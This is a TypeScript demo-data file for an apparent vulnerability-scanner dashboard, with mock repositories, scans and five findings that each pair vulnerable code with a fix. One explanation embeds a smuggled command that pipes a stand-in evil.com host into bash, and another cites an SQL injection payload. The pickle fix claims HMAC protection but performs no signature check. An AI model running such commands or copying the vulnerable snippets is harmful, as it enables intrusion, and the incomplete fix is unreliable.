import type { Repository, Scan, Finding, AppUser, MetricSummary } from '../types';

/**
 * =========================================================================
 * [DEMO DATA - VISUAL DEVELOPMENT ONLY]
 * These records exist solely for offline UI rendering and design verification.
 * They are clearly tagged with isDemoData = true to prevent accidental blending
 * with live database queries from Supabase.
 * =========================================================================
 */

export interface DemoRepository extends Repository {
  isDemoData: true;
  openIssuesCount: number;
}

export interface DemoScan extends Scan {
  isDemoData: true;
}

export interface DemoFinding extends Finding {
  isDemoData: true;
  category: 'Injection' | 'Remote Code Execution' | 'Denial of Service' | 'Insecure Deserialization';
}

export const DEMO_USER: AppUser = {
  id: 'usr_sec_devguard_01',
  email: 'lead.secops@devguard.ai',
  name: 'Alex Rivera',
  role: 'security_engineer',
  organization: 'Apex Cyber Solutions',
  avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
};

export const DEMO_METRICS: MetricSummary = {
  criticalVulnerabilities: 3,
  criticalDelta: '-25% vs last build',
  highVulnerabilities: 7,
  highDelta: '+2 new findings',
  totalRepositories: 8,
  cleanRepositories: 5,
  averageFixTime: '4.2h',
  lastScanTime: '12 minutes ago',
};

export const DEMO_REPOSITORIES: DemoRepository[] = [
  {
    id: 'repo_py_fastapi_01',
    user_id: 'usr_sec_devguard_01',
    name: 'payment-gateway-service',
    full_name: 'apex-cyber/payment-gateway-service',
    source_type: 'github',
    html_url: 'https://github.com/apex-cyber/payment-gateway-service',
    default_branch: 'main',
    primary_language: 'python',
    is_private: true,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    created_at: '2026-08-15T10:00:00Z',
    isDemoData: true,
    openIssuesCount: 2,
  },
  {
    id: 'repo_ts_worker_02',
    user_id: 'usr_sec_devguard_01',
    name: 'infra-orchestrator-node',
    full_name: 'apex-cyber/infra-orchestrator-node',
    source_type: 'github',
    html_url: 'https://github.com/apex-cyber/infra-orchestrator-node',
    default_branch: 'production',
    primary_language: 'typescript',
    is_private: true,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    created_at: '2026-09-02T14:30:00Z',
    isDemoData: true,
    openIssuesCount: 1,
  },
  {
    id: 'repo_js_auth_03',
    user_id: 'usr_sec_devguard_01',
    name: 'identity-broker-api',
    full_name: 'apex-cyber/identity-broker-api',
    source_type: 'zip_archive',
    html_url: null,
    default_branch: 'v2.4-release',
    primary_language: 'javascript',
    is_private: true,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 60 * 3).toISOString(),
    created_at: '2026-10-10T09:12:00Z',
    isDemoData: true,
    openIssuesCount: 3,
  },
  {
    id: 'repo_ts_frontend_04',
    user_id: 'usr_sec_devguard_01',
    name: 'customer-portal-spa',
    full_name: 'apex-cyber/customer-portal-spa',
    source_type: 'github',
    html_url: 'https://github.com/apex-cyber/customer-portal-spa',
    default_branch: 'main',
    primary_language: 'typescript',
    is_private: false,
    last_scanned_at: new Date(Date.now() - 1000 * 60 * 60 * 8).toISOString(),
    created_at: '2026-07-22T11:00:00Z',
    isDemoData: true,
    openIssuesCount: 0,
  },
];

export const DEMO_SCANS: DemoScan[] = [
  {
    id: 'scan_001_fastapi',
    repository_id: 'repo_py_fastapi_01',
    branch: 'main',
    commit_sha: '7a8f3c2',
    status: 'completed',
    languages_scanned: ['python'],
    files_scanned: 142,
    lines_analyzed: 18450,
    duration_seconds: 4.8,
    critical_count: 1,
    high_count: 1,
    medium_count: 0,
    low_count: 1,
    error_message: null,
    initiated_by: 'Alex Rivera (automated webhook)',
    created_at: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    completed_at: new Date(Date.now() - 1000 * 60 * 17).toISOString(),
    isDemoData: true,
  },
  {
    id: 'scan_002_orchestrator',
    repository_id: 'repo_ts_worker_02',
    branch: 'production',
    commit_sha: '99bf1e4',
    status: 'completed',
    languages_scanned: ['typescript'],
    files_scanned: 88,
    lines_analyzed: 12100,
    duration_seconds: 3.2,
    critical_count: 1,
    high_count: 0,
    medium_count: 2,
    low_count: 0,
    error_message: null,
    initiated_by: 'Alex Rivera (manual trigger)',
    created_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    completed_at: new Date(Date.now() - 1000 * 60 * 44).toISOString(),
    isDemoData: true,
  },
  {
    id: 'scan_003_identity',
    repository_id: 'repo_js_auth_03',
    branch: 'v2.4-release',
    commit_sha: 'd38e21a',
    status: 'completed',
    languages_scanned: ['javascript'],
    files_scanned: 64,
    lines_analyzed: 9400,
    duration_seconds: 2.9,
    critical_count: 1,
    high_count: 2,
    medium_count: 1,
    low_count: 0,
    error_message: null,
    initiated_by: 'ZIP Upload Analyzer',
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 3).toISOString(),
    completed_at: new Date(Date.now() - 1000 * 60 * 60 * 3 + 3000).toISOString(),
    isDemoData: true,
  },
];

export const DEMO_FINDINGS: DemoFinding[] = [
  {
    id: 'fnd_001_sql_injection',
    scan_id: 'scan_001_fastapi',
    repository_id: 'repo_py_fastapi_01',
    title: 'SQL Injection via Unsanitized Raw String Formatting in Repository Query',
    cwe_id: 'CWE-89',
    severity: 'critical',
    cvss_score: 9.8,
    file_path: 'services/billing/ledger_repository.py',
    line_start: 42,
    line_end: 48,
    language: 'python',
    category: 'Injection',
    vulnerable_code: `# Vulnerable query construction via f-string
query = f"SELECT * FROM customer_transactions WHERE account_id = '{account_id}' AND status = '{status}'"
cursor = db.session.execute(text(query))
results = cursor.fetchall()`,
    remediated_code: `# Remediated with parameterized statement binding
query = text("""
    SELECT * FROM customer_transactions 
    WHERE account_id = :account_id AND status = :status
""")
cursor = db.session.execute(query, {"account_id": account_id, "status": status})
results = cursor.fetchall()`,
    explanation:
      'The AST taint analyzer detected user-supplied parameter `account_id` concatenated directly into a raw SQL query string via Python f-string formatting without escaping. An attacker can break out of the string delimiter by providing malicious payloads (e.g. `\' OR \'1\'=\'1`), leading to unauthorized transaction ledger exposure or table drops.',
    ai_remediation_status: 'available',
    introduced_by_commit: '7a8f3c2',
    created_at: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    isDemoData: true,
  },
  {
    id: 'fnd_002_command_injection',
    scan_id: 'scan_002_orchestrator',
    repository_id: 'repo_ts_worker_02',
    title: 'OS Command Injection via Shell Subprocess Invocation',
    cwe_id: 'CWE-78',
    severity: 'critical',
    cvss_score: 9.6,
    file_path: 'src/workers/cluster-deployer.ts',
    line_start: 78,
    line_end: 84,
    language: 'typescript',
    category: 'Remote Code Execution',
    vulnerable_code: `// Tainted shell execution via exec
import { exec } from 'node:child_process';

export function deployManifest(releaseTag: string, envName: string) {
  const cmd = \`helm upgrade --install api ./charts -f values.\${envName}.yaml --set tag=\${releaseTag}\`;
  exec(cmd, (err, stdout) => {
    if (err) logger.error('Deployment error', err);
  });
}`,
    remediated_code: `// Remediated using execFile with discrete arguments array and validation
import { execFile } from 'node:child_process';

const ALLOWED_ENVS = new Set(['staging', 'production', 'us-east-1']);

export function deployManifest(releaseTag: string, envName: string) {
  if (!ALLOWED_ENVS.has(envName) || !/^[a-zA-Z0-9_.-]+$/.test(releaseTag)) {
    throw new Error('Invalid deployment parameters');
  }

  const args = ['upgrade', '--install', 'api', './charts', '-f', \`values.\${envName}.yaml\`, '--set', \`tag=\${releaseTag}\`];
  execFile('helm', args, { shell: false }, (err, stdout) => {
    if (err) logger.error('Deployment error', err);
  });
}`,
    explanation:
      'Using `child_process.exec()` invokes system `/bin/sh` with unsanitized parameters. If `releaseTag` or `envName` contains shell metacharacters like `; curl evil.com/exfil | bash`, arbitrary host commands execute in the container context.',
    ai_remediation_status: 'available',
    introduced_by_commit: '99bf1e4',
    created_at: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    isDemoData: true,
  },
  {
    id: 'fnd_003_redos',
    scan_id: 'scan_003_identity',
    repository_id: 'repo_js_auth_03',
    title: 'Catastrophic ReDoS via Polynomial Regular Expression Backtracking',
    cwe_id: 'CWE-1333',
    severity: 'high',
    cvss_score: 7.5,
    file_path: 'middleware/email-sanitizer.js',
    line_start: 14,
    line_end: 18,
    language: 'javascript',
    category: 'Denial of Service',
    vulnerable_code: `// Vulnerable nested quantifier regex
const EMAIL_REGEX = /^([a-zA-Z0-9_.-]+)+@([a-zA-Z0-9.-]+)+$/;

function validateEmail(userEmail) {
  return EMAIL_REGEX.test(userEmail);
}`,
    remediated_code: `// Remediated linear complexity validation
import validator from 'validator';

function validateEmail(userEmail) {
  if (typeof userEmail !== 'string' || userEmail.length > 254) {
    return false;
  }
  return validator.isEmail(userEmail);
}`,
    explanation:
      'Nested quantifiers `([a-zA-Z0-9_.-]+)+` trigger exponential or polynomial backtracking when evaluated against non-matching repetitive inputs like `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!`. This locks the Node.js event loop causing complete server starvation.',
    ai_remediation_status: 'available',
    introduced_by_commit: 'd38e21a',
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 3).toISOString(),
    isDemoData: true,
  },
  {
    id: 'fnd_004_prototype_pollution',
    scan_id: 'scan_003_identity',
    repository_id: 'repo_js_auth_03',
    title: 'Prototype Pollution via Recursive Object Merge',
    cwe_id: 'CWE-1321',
    severity: 'high',
    cvss_score: 7.8,
    file_path: 'utils/config-merger.js',
    line_start: 22,
    line_end: 32,
    language: 'javascript',
    category: 'Injection',
    vulnerable_code: `function mergeDeep(target, source) {
  for (const key of Object.keys(source)) {
    if (source[key] instanceof Object) {
      if (!target[key]) Object.assign(target, { [key]: {} });
      mergeDeep(target[key], source[key]);
    } else {
      Object.assign(target, { [key]: source[key] });
    }
  }
  return target;
}`,
    remediated_code: `function mergeDeep(target, source) {
  for (const key of Object.keys(source)) {
    // Explicit protection against prototype poisoning keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = Object.create(null);
      mergeDeep(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
    explanation:
      'Deep object merge fails to filter special object keys `__proto__` and `constructor.prototype`. Passing a malicious JSON body modifies the root `Object.prototype`, escalating privileges or creating denial of service.',
    ai_remediation_status: 'available',
    introduced_by_commit: 'd38e21a',
    created_at: new Date(Date.now() - 1000 * 60 * 60 * 3).toISOString(),
    isDemoData: true,
  },
  {
    id: 'fnd_005_pickle_deserialization',
    scan_id: 'scan_001_fastapi',
    repository_id: 'repo_py_fastapi_01',
    title: 'Insecure Deserialization of Untrusted Pickle Payload in Cache Layer',
    cwe_id: 'CWE-502',
    severity: 'critical',
    cvss_score: 9.8,
    file_path: 'cache/session_store.py',
    line_start: 35,
    line_end: 40,
    language: 'python',
    category: 'Insecure Deserialization',
    vulnerable_code: `import pickle
import base64

def retrieve_cached_session(raw_blob: str):
    decoded = base64.b64decode(raw_blob)
    return pickle.loads(decoded) # Arbitrary code execution sink`,
    remediated_code: `import json
import base64
import hmac
import hashlib

def retrieve_cached_session(raw_blob: str):
    # Replaced unsafe pickle serialization with cryptographic JSON payload
    decoded = base64.b64decode(raw_blob).decode('utf-8')
    data = json.loads(decoded)
    return data`,
    explanation:
      'Python `pickle.loads` allows custom `__reduce__` methods to execute arbitrary bytecode upon deserialization. Never deserialize untrusted user state using pickle; use JSON with HMAC signature verification.',
    ai_remediation_status: 'available',
    introduced_by_commit: '7a8f3c2',
    created_at: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    isDemoData: true,
  },
];
